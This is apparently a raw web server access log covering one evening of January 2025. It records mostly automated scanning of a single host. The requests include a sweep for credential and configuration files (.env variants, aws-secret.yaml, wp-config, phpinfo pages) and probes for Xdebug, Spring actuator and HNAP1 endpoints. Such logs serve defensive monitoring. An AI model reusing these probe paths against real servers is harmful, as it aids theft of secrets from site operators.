179.43.191.146 - - [09/Jan/2025:16:00:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [09/Jan/2025:16:00:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:16:27:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:16:27:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [09/Jan/2025:16:33:20 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
193.41.206.24 - - [09/Jan/2025:16:35:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:22 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:22 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:23 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:23 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:23 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:23 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:25 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:25 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:28 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:28 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:28 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:29 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:29 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:30 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:30 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:31 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:31 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:33 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:33 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:34 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:34 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:35 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:35 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:36 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:36 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:38 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:38 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:39 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:39 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:41 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:41 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:43 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:43 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:45 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:45 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:47 +0000] "GET /docker/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:47 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:49 +0000] "GET /docker/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:49 +0000] "GET /env.backup HTTP/1.1" 302 386 "-" "-"
185.225.232.90 - - [09/Jan/2025:16:51:49 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
185.225.232.90 - - [09/Jan/2025:16:52:16 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
185.225.232.90 - - [09/Jan/2025:16:52:16 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)"
185.225.232.90 - - [09/Jan/2025:16:52:16 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"
185.225.232.90 - - [09/Jan/2025:16:52:56 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91"
185.225.232.90 - - [09/Jan/2025:16:52:56 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36 OPR/19.0.1326.56"
185.225.232.90 - - [09/Jan/2025:16:52:58 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
178.128.54.126 - - [09/Jan/2025:17:02:51 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [09/Jan/2025:17:03:00 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
126.61.174.251 - - [09/Jan/2025:17:04:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
159.223.67.34 - - [09/Jan/2025:17:11:39 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [09/Jan/2025:17:11:49 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.247.210 - - [09/Jan/2025:17:16:35 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [09/Jan/2025:17:16:43 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.69.51 - - [09/Jan/2025:17:17:17 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
121.153.145.50 - - [09/Jan/2025:17:17:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
159.223.69.51 - - [09/Jan/2025:17:17:27 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
193.34.212.75 - - [09/Jan/2025:17:21:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
209.145.58.108 - - [09/Jan/2025:17:21:28 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
209.145.58.108 - - [09/Jan/2025:17:21:29 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
209.145.58.108 - - [09/Jan/2025:17:21:29 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
209.145.58.108 - - [09/Jan/2025:17:21:29 +0000] "GET / HTTP/1.1" 200 1761 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
83.222.191.146 - - [09/Jan/2025:17:27:21 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
185.16.39.104 - - [09/Jan/2025:17:34:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.200.78.250 - - [09/Jan/2025:17:35:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.128.205 - - [09/Jan/2025:17:45:30 +0000] "\x16\x03\x01" 400 528 "-" "-"
78.153.140.93 - - [09/Jan/2025:18:13:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:13:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:36:29 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:36:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [09/Jan/2025:18:38:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.90 - - [09/Jan/2025:19:03:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
114.7.20.38 - - [09/Jan/2025:19:41:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
112.171.234.60 - - [09/Jan/2025:19:58:05 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:20:01:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:20:01:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [09/Jan/2025:20:10:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.19.123.230 - - [09/Jan/2025:20:26:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.55.226 - - [09/Jan/2025:20:36:50 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [09/Jan/2025:20:44:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
209.159.214.143 - - [09/Jan/2025:21:03:08 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:21:16:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:21:16:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.121.79.3 - - [09/Jan/2025:21:26:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [09/Jan/2025:21:27:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
104.155.20.93 - - [09/Jan/2025:21:28:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
178.215.236.132 - - [09/Jan/2025:21:43:57 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/5.0.4.3000 Chrome/47.0.2526.73 Safari/537.36"
92.255.57.58 - - [09/Jan/2025:21:55:48 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:22:02:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [09/Jan/2025:22:14:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:22:14:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
114.217.217.138 - - [09/Jan/2025:22:16:44 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
193.200.78.250 - - [09/Jan/2025:22:31:27 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
185.16.39.104 - - [09/Jan/2025:22:32:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [09/Jan/2025:22:39:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
93.174.93.12 - - [09/Jan/2025:22:42:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.172 Safari/537.36 Vivaldi/2.5.1525.48"
206.168.34.65 - - [09/Jan/2025:22:42:22 +0000] "\x16\x03\x01" 400 528 "-" "-"
206.168.34.65 - - [09/Jan/2025:22:42:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.65 - - [09/Jan/2025:22:42:29 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.65 - - [09/Jan/2025:22:42:31 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.65 - - [09/Jan/2025:22:42:32 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
92.255.57.58 - - [09/Jan/2025:22:49:09 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [09/Jan/2025:22:49:09 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.120.115.34 - - [09/Jan/2025:22:59:09 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0"
91.223.3.201 - - [09/Jan/2025:23:05:07 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:23:09:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:23:09:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [09/Jan/2025:23:16:50 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
92.255.57.58 - - [09/Jan/2025:23:27:18 +0000] "\x16\x03\x01\x05\xa8\x01" 400 528 "-" "-"
147.185.132.156 - - [09/Jan/2025:23:30:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [09/Jan/2025:23:45:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:23:45:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [09/Jan/2025:23:54:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
